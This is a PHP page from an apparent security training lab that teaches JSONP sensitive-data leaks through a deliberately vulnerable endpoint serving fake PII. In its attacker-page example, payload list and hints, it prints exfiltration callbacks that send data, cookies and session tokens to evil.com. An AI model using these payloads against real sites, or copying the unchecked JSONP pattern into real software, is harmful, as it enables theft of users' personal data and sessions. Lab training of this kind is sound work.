<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['JSONP']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

if (!isset($_SESSION['jsonp_case2_attempts'])) {
  $_SESSION['jsonp_case2_attempts'] = 0;
}
if (!isset($_SESSION['jsonp_case2_solved'])) {
  $_SESSION['jsonp_case2_solved'] = false;
}

// VULNERABLE: JSONP endpoint leaking PII without origin checks
$callback = $_GET['callback'] ?? 'callback';

// Simulated user data (PII)
$user_data = [
  'user_id' => 1337,
  'username' => 'admin',
  'email' => 'admin@darkhunter.local',
  'full_name' => 'System Administrator',
  'phone' => '+1-555-0199',
  'ssn' => '123-45-6789',
  'credit_card' => '4532-1234-5678-9012',
  'api_key' => 'YOUR_BREVO_API_KEY',
  'role' => 'superuser',
  'last_login' => '2024-01-15 09:30:00',
  'session_token' => 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
];

$flag_triggered = false;
if (isset($_GET['callback'])) {
  $cb = $_GET['callback'];
  if (
    stripos($cb, 'alert') !== false ||
    stripos($cb, 'eval') !== false ||
    stripos($cb, 'fetch') !== false ||
    stripos($cb, 'console') !== false ||
    stripos($cb, 'document') !== false
  ) {
    $flag_triggered = true;
  }
}

$success_msg = null;
$already_solved = $_SESSION['jsonp_case2_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['jsonp_case2_attempts']++;
  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }
  $_SESSION['jsonp_case2_solved'] = true;
  $already_solved = true;
  $success_msg = "Great job! You've successfully exploited a Sensitive Data Leak via JSONP. By including the endpoint as a script tag with a malicious callback, you exfiltrated PII including emails, API keys, and session tokens cross-origin!";
}

if (isset($_GET['callback'])) {
  $_SESSION['jsonp_case2_attempts']++;
}

$attempts = $_SESSION['jsonp_case2_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Profile API - JSONP Case 2 (Sensitive Data Leak)</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/JSONP-CASE2.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to JSONP Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge easy"><i class="fas fa-seedling"></i> Easy Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-user-secret"></i> User Profile API</h1>
      <p class="lab-description">Access user profile data. This easy challenge exposes <strong>PII through JSONP without
          origin validation</strong>. Steal sensitive data cross-origin!</p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this Sensitive Data Leak vulnerability.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <div class="api-status-bar">
      <div class="api-indicator"><i class="fas fa-database"></i><span>Data: <strong>PII Exposed</strong></span></div>
      <div class="origin-indicator"><i class="fas fa-globe"></i><span>Origin Check: <strong>None</strong></span></div>
      <?php if ($flag_triggered): ?>
      <div class="exploit-indicator"><i class="fas fa-skull-crossbones"></i><span>EXPLOIT DETECTED!</span></div>
      <?php endif; ?>
    </div>

    <div class="jsonp-grid">
      <div class="jsonp-card data-card">
        <div class="card-header">
          <i class="fas fa-id-card"></i>
          <h3>Exposed User Data</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> No CORS</span>
        </div>
        <div class="data-content">
          <div class="data-grid">
            <div class="data-item"><span class="data-label">User ID</span><code
                class="data-value"><?php echo $user_data['user_id']; ?></code></div>
            <div class="data-item"><span class="data-label">Username</span><code
                class="data-value"><?php echo $user_data['username']; ?></code></div>
            <div class="data-item"><span class="data-label">Email</span><code
                class="data-value secret"><?php echo $user_data['email']; ?></code></div>
            <div class="data-item"><span class="data-label">Full Name</span><code
                class="data-value"><?php echo $user_data['full_name']; ?></code></div>
            <div class="data-item"><span class="data-label">Phone</span><code
                class="data-value secret"><?php echo $user_data['phone']; ?></code></div>
            <div class="data-item"><span class="data-label">SSN</span><code
                class="data-value danger"><?php echo $user_data['ssn']; ?></code></div>
            <div class="data-item"><span class="data-label">Credit Card</span><code
                class="data-value danger"><?php echo $user_data['credit_card']; ?></code></div>
            <div class="data-item"><span class="data-label">API Key</span><code
                class="data-value danger"><?php echo $user_data['api_key']; ?></code></div>
            <div class="data-item"><span class="data-label">Role</span><code
                class="data-value danger"><?php echo $user_data['role']; ?></code></div>
            <div class="data-item"><span class="data-label">Session Token</span><code
                class="data-value danger"><?php echo substr($user_data['session_token'], 0, 30); ?>...</code></div>
          </div>
        </div>
      </div>

      <div class="jsonp-card tester-card">
        <div class="card-header">
          <i class="fas fa-vial"></i>
          <h3>Data Exfiltration</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> Cross-Origin</span>
        </div>
        <div class="tester-content">
          <p class="tester-info">Include this endpoint as a script tag on any domain:</p>
          <div class="endpoint-box">
            <span class="endpoint-label">JSONP URL:</span>
            <code
              class="endpoint-url"><?php echo htmlspecialchars("http://" . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?')); ?>?callback=<span class="highlight">stealData</span></code>
          </div>
          <div class="exploit-code">
            <div class="code-label">Attacker Page:</div>
            <pre
              class="code-block"><code>&lt;script&gt;
function stealData(data) {
  fetch('//evil.com/log?d=' + btoa(JSON.stringify(data)));
}
&lt;/script&gt;
&lt;script src="<?php echo htmlspecialchars("http://" . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?')); ?>?callback=stealData"&gt;&lt;/script&gt;</code></pre>
          </div>
        </div>
      </div>

      <div class="jsonp-card analysis-card">
        <div class="card-header"><i class="fas fa-microscope"></i>
          <h3>Vulnerability Analysis</h3>
        </div>
        <div class="analysis-content">
          <div class="analysis-item">
            <span class="analysis-label">CORS Policy:</span>
            <code class="analysis-code">// Access-Control-Allow-Origin: *</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Wildcard</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Origin Validation:</span>
            <code class="analysis-code">// No origin check</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Missing</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Data Exposure:</span>
            <code class="analysis-code">// Full PII returned</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Excessive</span>
          </div>
        </div>
      </div>

      <div class="jsonp-card payloads-card">
        <div class="card-header"><i class="fas fa-bolt"></i>
          <h3>Exfiltration Payloads</h3>
        </div>
        <div class="payloads-list">
          <div class="payload-item">
            <div class="payload-name">Basic Data Steal</div>
            <code class="payload-code">?callback=steal=function(d){console.log(d)}</code>
            <span class="payload-target">Log all user data</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Cookie + Data</div>
            <code class="payload-code">?callback=fetch("//evil.com?c="+document.cookie+"&d="+JSON.stringify)</code>
            <span class="payload-target">Steal cookies + PII</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Session Hijack</div>
            <code class="payload-code">?callback=window.location="//evil.com?token="+data.session_token</code>
            <span class="payload-target">Redirect with session</span>
          </div>
        </div>
      </div>
    </div>

    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-code"></i><span>Current Request</span></div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>Callback: <?php echo htmlspecialchars($callback); ?></span>
          <span>Flag: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
          <span>Attempts: <?php echo $attempts; ?></span>
        </div>
      </div>
    </div>

    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">This endpoint returns full PII without checking the origin. Try
        <code>?callback=console.log</code> and check the browser console. All user data is exposed!
      </div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">The JSONP response can be included from any domain. Try <code>?callback=alert</code> to see
        the data structure, then craft a callback that exfiltrates the API key or session token!</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Use <code>?callback=eval("fetch('//evil.com?key='+data.api_key)")</code> or simply
        <code>?callback=alert</code> to trigger the flag. The endpoint exposes sensitive data without any origin
        protection!
      </div>
    </div>
    <?php endif; ?>

    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
  window.addEventListener('load', function() {
    const exploitIndicator = document.querySelector('.exploit-indicator');
    const alreadySolved = document.querySelector('.solved-banner');
    if (exploitIndicator && !alreadySolved) {
      document.getElementById('solved-flag').value = '1';
      document.getElementById('success-form').submit();
    }
  });
  </script>
</body>

</html>